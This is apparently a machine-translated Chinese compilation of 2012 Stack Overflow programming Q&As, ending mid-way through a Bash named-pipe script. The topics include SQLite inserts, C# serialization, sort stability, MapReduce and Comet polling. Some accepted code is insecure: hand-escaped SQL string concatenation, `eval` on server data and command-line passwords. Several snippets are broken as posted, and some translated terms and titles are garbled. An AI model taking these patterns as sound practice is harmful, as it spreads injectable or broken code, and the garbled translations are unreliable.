*   分辨率缩放？不那么重要，但是根据用户的显示器分辨率来确定覆盖比例的大小会很好。

我还没有开始，但是哪种项目类型最适合呢？我在考虑 WPF 而不是 WindowsForms，因为它似乎在演示方面提供了更多的灵活性。任何关于上述几点的建议将不胜感激！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:46:24.393

在 WPF 中，您可以这样做：

对于全局 TAB 键处理，在应用程序的入口点（通常是 App.xaml.cs），运行以下代码：

```
EventManager.RegisterClassHandler(typeof(UIElement), UIElement.PreviewKeyUpEvent, new KeyEventHandler(OnPreviewKeyUp)); 
```

根据需要使用 (Preview)Key(up/Down)Event，如果在 Preview 事件处理程序中设置 e.Handled = true，则事件将停止其路由，其他人将无法对其作出反应。

在 OnPreviewKeyUp 中，检查`e.Key == Key.Tab`并显示覆盖窗口（如果是）。

事件处理程序的签名应如下所示：

```
private static void OnPreviewKeyUp(object source, KeyEventArgs e) 
```

现在对于点击部分，制作一个窗口并将叠加层的背景设置为`null`：

```
WindowStyle="None" AllowsTransparency="True" Background="{x:Null}" 
```

# javascript - 无法在 Android 上将数据插入 SQLite DB

> ID：12461316
> 
> 赞同：0
> 
> 时间：2012-09-17T14:21:14.797
> 
> 标签：javascript, android, sqlite, insert

我正在尝试将 INSERT 插入到我正在开发的 android 应用程序中的 SQLite 数据库中。我有一个包含一些字段的 HTML 表单，我可以从这些字段中获取信息。当我尝试进行 INSERT 时，出现错误：“错误处理 SQL：未定义”。有谁能够帮我？我是一个新手。这是我正在使用的代码：HTML 表单

```
<form name="editNoteForm" id="editNoteForm" method="post" action="index.html">
  <label for="primeiroNome">1&#186; Nome</label>
    <input type="text" name="primeiroNome" id="primeiroNome">

  <label for="utlimoNome">&Uacute;ltimo Nome</label>
    <input type="text" name="ultimoNome" id="ultimoNome">

  <label for="numeroTelefone">Telefone</label>
    <input type="number" name="numeroTelefone" id="numeroTelefone">

  <input type="submit" onclick="onSubmit();" id="editFormSubmitButton" value="Save Note">

</form> 
```

Javascript代码

```
function onSubmit() {
         db.transaction(addRowDB, errorCB, successCB);
         alert('Done');
    }

    function addRowDB(tx) {
        var primeiroNome = document.getElementById('primeiroNome').value;
        var ultimoNome = document.getElementById('ultimoNome').value;
        var numeroTelefone = document.getElementById('numeroTelefone').value;
        tx.executeSql('INSERT INTO DEMO (id, nome, ultimo, telefone) VALUES (null, primeiroNome, ultimoNome, numeroTelefone)');

    } 
```

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T15:56:26.183

我发现了问题。真的是''。所以我寻找一个将它们放在变量之前和之后的函数，它可以工作。代码是这个：

```
function sqlstr(s) {
    return "'"+s.replace(/'/g, "''")+"'";
}

    function addRowDB(tx) {
        var primeiroNome = document.getElementById('primeiroNome').value;
        var ultimoNome = document.getElementById('ultimoNome').value;
        var numeroTelefone = document.getElementById('numeroTelefone').value;
        tx.executeSql('INSERT INTO DEMO (id, nome, ultimo, telefone) VALUES (null, ' + sqlstr(primeiroNome) + ', ' + sqlstr(ultimoNome) + ', ' + sqlstr(numeroTelefone) + ')');

    } 
```

谢谢您的帮助 ：）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:45:05.340

```
 tx.executeSql('INSERT INTO DEMO (id, nome, ultimo, telefone) VALUES (null, primeiroNome, ultimoNome, numeroTelefone)'); 
```

将插入文字值“primeiroNome”...

您需要插入变量 primeiroNome ... 的值（例如，使用连接 (+)）

# android - 我可以将文件夹添加到 Drawables 并在其中循环文件吗？

> ID：12461319
> 
> 赞同：0
> 
> 时间：2012-09-17T14:21:22.123
> 
> 标签：android

想问我如何将我自己的带有可绘制对象的文件夹添加到资源中？我以后如何循环浏览特定文件夹中的所有文件？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:34:04.923

你不能。很遗憾。

可能，您可以在资产文件夹中这样做，就像他们在[Android 资产文件夹中所做的那样](https://stackoverflow.com/questions/3033902/android-assets-with-sub-folders)

# c# - [System.SerializableAttribute()] 有什么作用？

> ID：12461321
> 
> 赞同：23
> 
> 时间：2012-09-17T14:21:40.670
> 
> 标签：c#

我正在查看其他人的 C# 代码，在公共枚举之前有以下几行：

```
[System.CodeDom.Compiler.GeneratedCodeAttribute("xsd", "4.0.30319.1")]
[System.SerializableAttribute()]
[System.Xml.Serialization.XmlTypeAttribute(AnonymousType=true)]
[System.Xml.Serialization.XmlRootAttribute(Namespace="", IsNullable=false)] 
```

有人可以用简单的英语解释这`SerializableAttribute`条线是做什么的吗？

我已经看到了[这个页面](http://msdn.microsoft.com/en-us/library/system.serializableattribute.aspx)——这对我来说没有多大意义——我是 C# 的新手。

* * *

## 回答 #1

> 赞同：69
> 
> 时间：2012-09-17T14:31:57.237

这其实很微妙……

*从表面上看*，答案只是“它`SerializableAttribute`为类添加了元数据”，其目的`SerializableAttribute`是宣传（对诸如此类的东西`BinaryFormatter`）一个类型可以被序列化。`BinaryFormatter`将拒绝序列化未明确宣传序列化的事物。这可能是`BinaryFormatter`用于实现*远程处理*并防止数据意外泄漏到远程处理边界的结果。

请注意，大多数序列化程序并不*关心*，`SerializableAttribute`因此这*只会*影响`BinaryFormatter`. 例如`XmlSerializer`， JSON.NET`DataContractSerializer`或`JavaScriptSerializer`protobuf-net 都没有真正关心`SerializableAttribute`.

但是，*实际上*，它***不是***标准属性，而是由编译器进行了特殊处理：

*   大多数属性是技术上的`.custom instance`值（在 IL 术语中）
*   然而，`SerializableAttribute`实际上映射到一个 CLI`.class`标志，`serializable`

这不会改变*意思*，但是：作为一个新奇的事实，`SerializableAttribute`实际上并没有作为*属性*实现。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-09-17T14:25:06.440

System.SerializableAttribute 向运行时指定可以序列化该类的实例

例如。您在 WCF 服务调用中返回一个对象。如果该对象具有此属性并且其中的所有对象都是可序列化的，则运行时将根据 Web 服务返回的资源类型将该对象转换为 JSON 或 XML。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-17T14:24:54.830

这只是长期的`[Serializable]`。它将类标记为可以“转换”为其他格式的类。

常见示例包括将类“序列化”为 JSON 或 XML 数据结构，以及“来自”此类结构的等效转换。

考虑一个类

```
[Serializable]
class MyClass
{
    public string Mem1 {get; set;}
    public string Mem2 {get; set;}
}

...
MyClass mc = new MyClass;
mc.Mem1 = "Hello";
mc.Mem2 = "World"; 
```

当序列化为 JSON 结构时，我们得到：

```
"{'Mem1':'Hello','Mem2':'World'}" 
```

并且考虑到该过程的双向性质，如果我们接收到这种格式的信息（例如，从某个 Web 服务返回），那么我们可以愉快地将其序列化回该类的一个实例。

基于 JSON 示例，我们在命名空间`System.Web.Script.Serialization`中找到了一系列可以帮助我们解决此问题的类。特别是，`JavaScriptSerializer`类帮助我们提供`Serialize()`和`Deserialize`方法。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-17T14:24:10.060

从[文档中](http://msdn.microsoft.com/en-us/library/system.serializableattribute.aspx)：

> 表示一个类可以序列化

有关示例，请参阅文档。

# javascript - 日期选择器在 IE8 中不起作用

> ID：12461323
> 
> 赞同：0
> 
> 时间：2012-09-17T14:21:49.657
> 
> 标签：javascript, jquery

嗨，我的 datepicker 无法在 IE7 或 8 上运行时遇到问题，在 Chrome 和 Firefox 中运行良好，任何人都可以阐明问题可能是什么，我是一个相对新手，所以任何建议都会有所帮助。这是我的代码

```
<script type="text/javascript" src="jquery/jquery.js"></script>
<link rel="stylesheet" href="jquery/themes/custom-theme/jquery.ui.all.css">
<script src="jquery/ui/jquery.ui.core.js"></script>
<script src="jquery/ui/jquery.ui.widget.js"></script>
<script src="jquery/ui/jquery.ui.datepicker.js"></script>
<script src="jquery/ui/jquery.ui.datepicker-de.js"></script>
<script>
// Please add here the days you want to avoid shipping cakes, like new year, etc.
natDays = [
[1, 2, 'new year'], [6, 7,], [8, 15,], [10, 26,], [11, 1,], [12, 8,],
// [1, 26, 'au'], [2, 6, 'nz'], [3, 17, 'ie'],
//  [4, 27, 'za'], [5, 25, 'ar'], [6, 6, 'se'],
// [7, 4, 'us'], [8, 17, 'id'], [9, 7, 'br'],
//[10, 1, 'cn'], [11, 22, 'lb'], [12, 12, 'ke']
];

function nationalDays(date) {
for (i = 0; i < natDays.length; i++) {
  if (date.getMonth() == natDays[i][0] - 1
      && date.getDate() == natDays[i][1]) {
    return [false, natDays[i][2] + '_day'];
  }
}
 return [true, ''];
}

function noWeekendsOrHolidays(date) {
var noWeekend = $.datepicker.noWeekends(date);
if (noWeekend[0]) {
    return nationalDays(date);
} else {
    return noWeekend;
}
}

$(document).ready(function(){   
$(function() {
    $( "#datepicker" ).datepicker({
        showOn: "button",
        buttonImage: "jquery/calendar.gif",
        buttonImageOnly: true,  
        gotoCurrent: true,
        minDate: +9,
        beforeShowDay: noWeekendsOrHolidays,
        regional: "DE" 
    });
    //$( "#datepicker" ).datepicker.regional['de'];
});

$("#shipping").change(function() {

    if( $('#shipping option:selected').text() == 'Deutschland' ){
        $( "#datepicker" ).datepicker( 'option' , 'minDate' , '+9' );
        $( "#datepicker" ).datepicker( 'setDate' , null );
    }
    else{
        $( "#datepicker" ).datepicker( 'option' , 'minDate' , '+4' );
        $( "#datepicker" ).datepicker( 'setDate' , null );
    }
});

// And now fire change event when the DOM is ready
// $('#shipping').trigger('change');
 });
 </script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:44:41.160

尽管评论回答了这个问题，但它有一个答案：

如果 Internet Explorer javascript 在数组中遇到尾随逗号，它将中断，请将其删除。

# magento - Magento 控制器在管理员中转发

> ID：12461326
> 
> 赞同：1
> 
> 时间：2012-09-17T14:21:57.597
> 
> 标签：magento, magento-1.7, adminhtml

我正在根据[这篇文章](http://www.magentocommerce.com/wiki/5_-_modules_and_development/0_-_module_development_in_magento/custom_module_with_custom_database_table)创建简单的 Magento 模块。
我的管理员**新项目**操作有问题。

```
<?php

class Namespace_Gallery_Adminhtml_GalleryController extends Mage_Adminhtml_Controller_Action
{
protected function _initAction()
{
    $this->loadLayout()
        ->_setActiveMenu('namespace/gallery');

    return $this;
}

public function indexAction()
{
    $this->_initAction();
    $this->_addContent($this->getLayout()->createBlock('gallery/adminhtml_gallery'));
    $this->renderLayout();
}

public function editAction()
{
    echo 'edit';
}

public function newAction()
{
    $this->_forward('edit');
} 
```

项目 indexAction 工作并显示我的项目，当我单击任何项​​目时，它会按预期返回“编辑”。不幸的是，单击“添加新项目”会给出 404（网址很好）。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-04T09:25:06.073

根据您调用请求的自定义操作的方式，您可能需要在 config.xml 中添加一些内容

假设这就是你所说的：http(s)://yourdomain.com/index.php/gallery/admin_gallery/new

然后将以下内容添加到`<admin><routers>`-node内的 config.xml

```
<gallery>
    <use>admin</use>
    <args>
        <module>Namespace_Gallery</module>
        <frontName>gallery</gallery>
    </args>
</gallery> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T15:28:33.080

您需要添加 adminhtml 布局更新 xml：

```
<?xml version="1.0"?>
<layout>
    <[module]_adminhtml_[controller]_index>
        <reference name="content">
                <block type="[module]/adminhtml_[frontname]" name="[module]_grid"/>
        </reference>
    </[module]_adminhtml_[controller]_index>
</layout> 
```

当然需要在 config.xml 中设置

```
<adminhtml>
    <layout>
        <updates>
            <[module]>
                <file>[module].xml</file>
            </[module]>
        </updates>
    </layout>
</adminhtml> 
```

您可能需要在 editAction() 中加载/渲染布局

# c# - 列表的行为 .NET 4.5 中的 .Sort 从 .NET 4.0 更改？

> ID：12461328
> 
> 赞同：26
> 
> 时间：2012-09-17T14:22:00.080
> 
> 标签：c#, .net, .net-4.0, .net-4.5

我在针对 .NET 4.0 的项目中进行了以下测试：

```
[TestFixture]
public class Donkey
{
    [Test]
    public void TestListSorting()
    {
        var expected = new[]
                    {
                                MockRepository.GenerateStub<IComparable>(),
                                MockRepository.GenerateStub<IComparable>()
                    };

        var sorted = new List<IComparable>(expected);

        CollectionAssert.AreEqual(expected, sorted);
        sorted.Sort();
        CollectionAssert.AreEqual(expected, sorted);

    }
} 
```

如果我在仅安装 .NET 4.0 的机器上运行它，它会失败。如果我在仅安装 .NET 4.5 的机器上运行它，它就会通过。

我假设在 .NET 4.5 中，在对每个返回的对象列表进行排序时，已经更改了实现以`Sort`保持顺序。`0``CompareTo`

**现在，抛开这个测试明显的疯狂。我知道依赖这种行为是很疯狂的。**

*这肯定*是一个突破性的变化吗？[本页](http://msdn.microsoft.com/en-us/library/hh367887.aspx)未列出.NET 4.0 和 4.5 之间的兼容性。

是否有一个原因？我错过了什么吗？是否有另一个页面显示实际的重大更改？我应该坐下来停止恐慌吗？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-09-17T14:54:55.793

我之前回答过[类似的问题](https://stackoverflow.com/questions/12156627/string-sorting-performance-degradation-in-vs2010-vs-vs2008/12184039#12184039)。排序方法在 4.5 和 4.0 之间发生了变化，从快速排序变为[内省排序](http://en.wikipedia.org/wiki/Introsort)。

它实际上更快，但它仍然不是稳定的排序¹，也就是说，通过保留相等项的顺序，每次执行都具有相同的输出。由于没有实现`List.Sort`是一种稳定的排序，我认为您运行单元测试的次数不够多，以至于在两个运行时都会出错？

我尝试使用等效代码和返回 0 的比较器自己重现它。在 .NET 4.5 和 .NET 3.5 中，有时会保留列表顺序，有时则不会。

即使它确实将排序类型从稳定更改为不稳定，**也不是重大更改**。使用的排序类型和确切的输出不是`List.Sort`. 方法合同保证的所有内容是您的项目将根据使用的比较器按排序顺序排列。

~~不过，这很有趣，因为 [MSDN 文档](http://msdn.microsoft.com/en-us/library/b0zbh7b6.aspx) 仍然说它使用 QuickSort（通过 `Array.Sort`），但这是如果您要逐步浏览 .NET 参考源，情况并非如此。~~

* * *

^([1]) [根据使用 和 混合的定义`QuickSort`，`HeapSort`它应该是一种不稳定的排序。甚至该算法的设计者 David Musser 在[他的论文](http://www.cs.rpi.edu/~musser/gp/introsort.ps)中也表示：]

> [Introsort 和快速排序一样，是不稳定的——不保留等价元素的顺序——因此仍然需要对稳定的排序例程有单独的要求。]

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-17T14:33:20.920

for[的规范](http://msdn.microsoft.com/en-us/library/b0zbh7b6%28v=vs.100%29.aspx)`List.Sort`说使用的排序是不稳定的，因此可能无法保留相等元素的顺序；它没有指定相等元素的*特定*重新排序，因此您不能真正将此更改称为重大更改。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-17T14:36:54.570

正如@Rawling 所说，请查看以下[文档`Sort()`](http://msdn.microsoft.com/en-us/library/b0zbh7b6.aspx)：

> 此实现执行不稳定的排序；也就是说，如果两个元素相等，则可能不会保留它们的顺序。

因此，您正在尝试测试明确记录为未定义的内容。这不是一个突破性的变化。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-17T14:40:02.603

我没有看到任何变化。正如其他人已经写的那样，两个版本都执行不稳定的排序。这意味着您不能依赖相等比较的元素的顺序。他们的顺序在排序过程中可能会或可能不会改变。这当然不是一个突破性的变化。

请参阅：[List< T >.Sort 的文档](http://msdn.microsoft.com/en-us/library/b0zbh7b6.aspx)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-17T14:36:48.630

来自[MSDN](http://msdn.microsoft.com/en-us/library/w56d4y5z%28v=vs.100%29.aspx)

> 此实现执行不稳定的排序；也就是说，如果两个元素相等，它们的顺序可能不会被保留

看起来订单不可靠，因此测试无效。另外，您为什么还要测试该`Sort`方法？对我来说似乎是一个不必要的测试。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-09-24T11:24:35.027

像这样的问题经常会出现新的框架版本。[这里](https://stackoverflow.com/questions/5123886/)和[这里](https://stackoverflow.com/questions/15338380/)有一些用于 3.5 → 4.0 的过渡。

正如您的问题所示，对于这种特定的版本更改，差异已经出现在一个数组或`List<>`两个元素中。另一个简单的例子是：

```
using System;
using System.Linq;

namespace SortTest
{
  static class Program
  {
    static void Main()
    {
      var arr = new[] { new { Name = "Mary", Age = 17, }, new { Name = "Louise", Age = 17, }, };

      Array.Sort(arr, (x, y) => x.Age.CompareTo(y.Age));

      Console.WriteLine(string.Join(",", arr.Select(x => x.Name)));
    }
  }
} 
```

使用 .NET 4.0 会打印`Louise,Mary`. 元素被交换。但是，使用 .NET 4.5 会打印`Mary,Louise`. 请注意，这两个女孩的年龄相同。

`List<>.Sort`实例方法和`Array.Sort`静态方法被*记录*为不稳定的排序。他们可以按照他们想要的任何顺序自由地留下相同“大小”的元素。因此，您的代码不得对等效元素的顺序做出任何假设。

相比之下，Linq 的`OrderBy`方法执行的是稳定的排序。所以

```
var ordered = arr.OrderBy(x => x.Age); 
```

*要求*不要交换 Mary 和 Louise，*因为*他们有相同的`Age`.

# c# - Arrays如何实现IList 没有在 C# 中实现属性“计数”？

> ID：12461330
> 
> 赞同：26
> 
> 时间：2012-09-17T14:22:08.097
> 
> 标签：c#, arrays, list

很长一段时间以来，我对以下内容感到好奇：

```
int[] array = new int[1];
int iArrayLength = array.Length;    //1 
```

由于数组实现了 IList 接口，因此允许以下操作：

```
int iArrayCount = ((IList<int>)array).Count;    //still 1 
```

但：

```
int iArrayCount = array.Count;  //Compile error. WHY?
int iArrayLength = array.Length;    //This is what we learned at school! 
```

问题：数组如何实现`IList<T>`（尤其是`int Count { get; }`from 的属性`IList<T>`）而不允许在基类上使用它？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-09-17T14:24:27.480

这称为显式接口成员实现。接口成员不作为类型的公共成员公开，但可以通过将引用转换为接口类型来使用。

这可以像这样在 C# 中完成：

```
interface I
{
    void M();
}

class C : I
{
    public int P { get; set; }
    void I.M() { Console.WriteLine("M!"); }
} 
```

然后你可以像这样使用这些类型：

```
C obj = new C();
obj.P = 3;
((I)obj).M(); 
```

但这不会编译：

```
obj.M(); 
```

正如 JeffN825 所指出的，显式实现接口成员的一个原因是类型不支持它们。例如，`Add`抛出异常（[相关讨论](https://stackoverflow.com/questions/5968708/why-array-implements-ilist)）。显式实现成员的另一个原因是它复制了另一个具有不同名称的公共成员。这`Count`就是明确实施的原因；对应的public成员是`Length.` 最后隐式实现的一些成员，即indexer。这两行都有效（假设`arr`是一个数组`int`）：

```
arr[0] = 8;
((IList<int>)arr)[0] = 8; 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-09-17T14:24:08.087

因为 Array 不支持 IList 的所有功能（添加/删除/等），所以 IList.Count（和其他几种方法）都是私有（显式）实现的。你可以在反汇编中看到：

```
int ICollection.Count 
```

如果你真的想使用 Count，你可以这样做

```
((IList)myArray).Count 
```

# javascript - Internet Explorer 何时在文档对象上引入 readyState 属性？

> ID：12461332
> 
> 赞同：4
> 
> 时间：2012-09-17T14:22:18.970
> 
> 标签：javascript, internet-explorer, dom, readystate

Internet Explorer 支持文档上的 readyState 属性...

[http://msdn.microsoft.com/en-us/library/ie/ms534359(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/ie/ms534359(v=vs.85).aspx)

但是这是在哪个版本的 IE 中引入的呢？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:29:30.107

它是在 IE4 中引入的： [见这里](http://javascript.gakaa.com/script-readystate.aspx)

# mapreduce - 所有的 reducer 是如何得出一个答案的？

> ID：12461333
> 
> 赞同：1
> 
> 时间：2012-09-17T14:22:20.777
> 
> 标签：mapreduce, mrjob

我开始使用 mrjob python 包学习 MapReduce。mrjob 文档列出了以下片段作为示例 MapReduce 脚本。

```
"""The classic MapReduce job: count the frequency of words.
"""
from mrjob.job import MRJob
import re

WORD_RE = re.compile(r"[\w']+")

class MRWordFreqCount(MRJob):

    def mapper(self, _, line):
        for word in WORD_RE.findall(line):
            yield (word.lower(), 1)

    def combiner(self, word, counts):
        yield (word, sum(counts))

    def reducer(self, word, counts):
        yield (word, sum(counts))

 if __name__ == '__main__':
     MRWordFreqCount.run() 
```

我了解该算法的一般工作原理，组合器（不需要运行）的作用，以及化简器如何在映射器和组合器的混洗和排序值上运行。

但是，我不明白减速器是如何得出单个值的。集群的不同节点上没有运行不同的reduce进程吗？如果分区器仅将某些经过洗牌的键值对发送到某些缩减器，这些缩减函数如何得出一个单一的答案？

我想我对如何将各种减速器的输出组合成一个答案感到困惑。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T06:24:03.660

基本上，所有具有相同键的值都转到一个减速器。所以即使有多个reducer，每个reducer都拥有一个key所需的所有数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-23T19:26:09.637

简短的回答是*他们没有*。正如您正确注意到的那样，所有结果都必须发送到单个 reducer，才能获得单个结果。

您通常应该期望对 map-reduce 作业的输出进行一些后处理。这项工作进行繁重的处理，但每个减速器都会输出单独的结果。

您通常会在不同的环境中进行处理，但通常情况下，我只是添加了一个额外的工作（将第一个工作的输出作为输入）和一个身份映射器（不处理数据）将所有内容发送到单个reducer（映射器发出的所有值共享相同的键）。然后这个 reducer 可以对结果进行最终聚合。这可能并不总是获得聚合结果的有效且快速的解决方案，但有时，开销足够小，将所有内容保存在 1 个 mrjob 类中会更容易。

# php - Comet - filemtime 以外的标记

> ID：12461335
> 
> 赞同：0
> 
> 时间：2012-09-17T14:22:25.963
> 
> 标签：php, jquery, ajax

我正在寻找一些解决方案，例如 .net php 观察者，我遇到了[这段](http://www.screenr.com/SNH)代码，它显示在下面。我的应用程序应该等到数据库更改发生 - 新记录或现有记录状态的更改，然后重新填充客户端页面上的记录列表。问题是 - 我没有使用下面代码块中的 txt 文件，因此我可能无法使用`filemtime`检查数据库中的更改或新记录。我如何处理数据库查询结果？

需要根据我的需要修改的代码块：

```
<script>

var timestamp = null;
function wait_for_message(){
    $.ajax({
        type: "GET",
        url: "get_data.php?time_stamp=" + time_stamp, 
        async: true,
        cache: false,
        success: function (data){
            var json - eval('(' + data + ')');
            if(json['msg'] != "") {
            alert(json['msg'] );
        }
        time_stamp = ['time_stamp'];
        setTimeout('wait_for_message(), 1000);
    }});
}

$(document).ready(function (){
    wait_for_message();
});

</script> 
```

和 php 文件

```
<?php

$filename = dirname(__FILE__).'/data.txt';

$last_modif = isset($_GET['time_stamp']) ? $_GET['time_stamp'] : 0;
$current_modif = filemtime($filename);

while ($current_modif <= $last_modif){
    usleep(1000);
    clearstartcache();
    $current_modif = filemtime($filename);
}

$response = array();
$response['msg'] = file_get_contents($filename);
$response['time_stamp'] = $current_modif;
echo json_encode($response);

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T15:03:33.747

在发现 node.js 之前我正在使用此代码

那是很久以前的事了，但是您可以简单地在名为 time_stamp 的表中添加一列，然后在添加行时将 time() 放入其中（或任何指示插入时间的内容）。

```
$last_modif = isset($_GET['time_stamp']) ? $_GET['time_stamp'] : 0;
$current_modif = $query("select `time_Stamp` from table order by time_stamp desc limit 1" ); 
```

# java - 使用 Jackson 将 BigInteger 字段序列化为字符串（以普通表示法）

> ID：12461342
> 
> 赞同：4
> 
> 时间：2012-09-17T14:23:01.343
> 
> 标签：java, json, serialization, jackson, biginteger

有没有办法以纯格式将 BigInteger 字段序列化为 String JavaScript 对象字段，而不是指数符号中的 Numeric（这是 Jackson 的默认行为）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T17:17:02.350

您可以使用使用 JsonSerialize 注释定义的特定序列化程序

[http://jackson.codehaus.org/1.2.1/javadoc/org/codehaus/jackson/map/annotate/JsonSerialize.html](http://jackson.codehaus.org/1.2.1/javadoc/org/codehaus/jackson/map/annotate/JsonSerialize.html)

问题类似于这个问题：

[Java 到 Jackson JSON 序列化：Money 字段](https://stackoverflow.com/questions/11319445/java-to-jackson-json-serialization-money-fields)

# c# - 如何获取自定义 UserControl 的类型？

> ID：12461343
> 
> 赞同：0
> 
> 时间：2012-09-17T14:23:01.643
> 
> 标签：c#, wpf

我有一些自定义 WPF `UserControl`。

它有这样的实现

```
public partial class CustomControl : UserControl, IMyPluginInterface 
```

如何在其他应用程序中获取该 UserControl 的类型？

或者如何枚举汇编中的类型？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:27:21.470

试试这个：

```
Type myType = myCustomUserControl.GetType(); 
```

# mysql - 在 Bash 脚本中避免 MySQL 读取竞争条件

> ID：12461344
> 
> 赞同：2
> 
> 时间：2012-09-17T14:23:02.857
> 
> 标签：mysql, bash

我有一个应用程序可以将数据复制到外部磁盘上。复制请求存储在 MySQL 数据库中，将从多个复制机器读取，这些复制机器运行 bash 脚本来获取请求。一旦接收到请求，它就会在数据库中设置为“进行中”。但是，我试图避免多台机器一起读取请求并开始复制相同数据的情况。

我打算使用表锁定来执行此操作，但我很挣扎，因为会话过期时表锁也会过期，所以如果我这样做：

```
mysql="mysql -h dbhost -u user -pPassword diskcopydb"
echo "LOCK tables diskcopy WRITE;" | $mysql
echo "SELECT SQL_NO_CACHE * FROM diskcopy WHERE status=\"request\"" | $mysql 
```

锁在获取请求时实际上已经过期，因此竞争条件仍然存在。这里有一个问题：

[命令行中的 MySQL - 我实际上可以使用 LOCK 吗？](https://stackoverflow.com/questions/1324697/mysql-from-the-command-line-can-i-practically-use-locks)

SQL 命令被打包到一个块中，它们一起通过管道传输到 MySQL，但我需要从 MySQL 中途获取输出以获取请求。有人有这个食谱吗？看起来它应该是一个相当常见的用例......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T08:37:35.403

这个问题实际上在这里得到了回答：

[从 bash 批量插入 MySQL 相关表](https://stackoverflow.com/questions/10092036/bulk-insert-of-mysql-related-tables-from-bash)

换句话说，使用 Bash 与 MySQL 进行双向通信是很棘手的，使用 Perl 或 Python 等“适当的”编程语言更容易，您可以在其中打开和保持连接。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-27T23:38:40.417

# 不可能是可能的！

> *>但我需要从 MySQL 中途获取输出以获取请求。有人有这个食谱吗？*

这是我的解决方案演示：

```
#!/bin/bash
################################################################################
#                  Bash synchronous client-server                              #
#                              or                                              #
#     Bash parallel processes with synchronized rendezvous points              #
#                              or                                              #
#          Bash interprocess communication with named pipes                    #
################################################################################
#Declare your session 'globals'
args=    #command line arguments are stored here
DIR=     #script's current path is stored here

#Early store your bash args before you lose them
for arg in "$@"; do
   args[i]=$arg
   (( i+=1 ))
done
################################################################################
## Initialize constants                                                       ##
#------------------------------------------------------------------------------#
# Explain more...                                                              #
################################################################################
function init_vars() {
   #absolute path of this script
   DIR=$( cd "$( dirname "$0" )" && pwd )
   #global MYSQL_PASS is defined in ~/.profile
   #this is the file where we store MySQL root password
   if [[ ! $MYSQL_PASS ]]; then
      MYSQL_PASS='.mysqlpass'
   fi
   #do some other stuff here...
}

################################################################################
## Rotate over passed arguments                                               ##
#------------------------------------------------------------------------------#
#Parse array 'args' based on the logic of your command line argument syntax    #
#Say, '--db <database>' denotes the processing of one database, '--db all' of  #
#all databases etc.                                                            #
#Linux utilities have contradicting rules for such kind of argument processing #
#(full of crap!), i.e. see tar: tar -xvf or tar --xfv or tar xvf, mysql -p     #
#<pass> or mysql -p=<pass> or mysql -p'<pass>' (???)                           #
################################################################################
function parse_args() {
   #your logic goes here
}

################################################################################
## Opens a MySQL client session                                               ##
#------------------------------------------------------------------------------#
# For security reasons password is kept in a file given by MYSQL_PASS.         #
################################################################################
function mysql_client() {
   mysql --host=127.0.0.1 --port=3306 --default-character-set=utf8 -u root -p"$( cd $DIR; cat $MYSQL_PASS )"
}

################################################################################
## A job dispatcher                                                           ##
#------------------------------------------------------------------------------#
# This thread initiates the workers and also reads intermediate results from   #
# the spawned jobs. We don't want to parallelize the whole part of a job but   #
# rather to put some parts to run in parallel with the dispatcher and some     #
# parts in a sequential order determined by what we call rendezvous points.    #
# See the diagram: A, B, C, D, E and F are events or actions during the life of#
# a program.                                                                   #
#                                                                              #
#  dispatcher                                                                  #
#     |         start                                                          #
#     A     ---------------->    worker                                        #
#     |                            |                                           #
#     B (read blocks)              C                                           #
#     |                   signals  |                                           #
#     B (unblocks)<--------------- D (write blocks)                            #
#     |                            |                                           #
#     E (1st set of results)       F                                           #
#     |                            |                                           #
# We can only guarantee that E comes after D or, D->E in time but E->F or F->E #
# and B->C or C->B (we don't care)                                             #
################################################################################
function dispatcher() {
   #go to the directory of this script
   cd $DIR
   #make a temporary directory secured in 'time & space'
   TMPDIR=$( mktemp -d XXXXXXXXXX )
   #catch exit of this script and delete temporary folder
   trap 'cd $DIR && rm -rf "$TMPDIR"' EXIT
   #move into the temporary folder
   cd ${TMPDIR}
   #create named pipes-global to all functions of this script
   TMPSQL=mysql-$RANDOM.$RANDOM.$RANDOM.$$
   TMPSCRIPT=myscript-$RANDOM.$RANDOM.$RANDOM.$$
   mkfifo $TMPSQL
   mkfifo $TMPSCRIPT
   #exec 3<> ${DIR}/${TMPDIR}/$TMPSQL || (echo 'error'; exit 1)
   #exec 4<> ${DIR}/${TMPDIR}/$TMPSCRIPT || ( echo 'error'; exit 1)
   echo '===1.PARENT=== Starting background jobs...'
   echo 'We can guarantee the succession only of 2->3,4 and 5->6,7 but NOT 3->4 or 6->7!'
   worker &
   ##################################
   cat $TMPSQL #make a blocking read!
   ##################################
   echo '===4.PARENT=== ...1st query has been read'
   ##################################
   cat $TMPSQL #make a blocking read!
   ##################################
   echo '===7.PARENT=== ...2nd query has been read'
   #don't you dare to exit!
   ##################################
   cat $TMPSQL #make a blocking read!
   ##################################
}

################################################################################
## A job spawned by the dispatcher                                            ##
#------------------------------------------------------------------------------#
################################################################################
function worker() {
   echo "===2.CHILD=== Executing 1st query......writing to $TMPSQL"
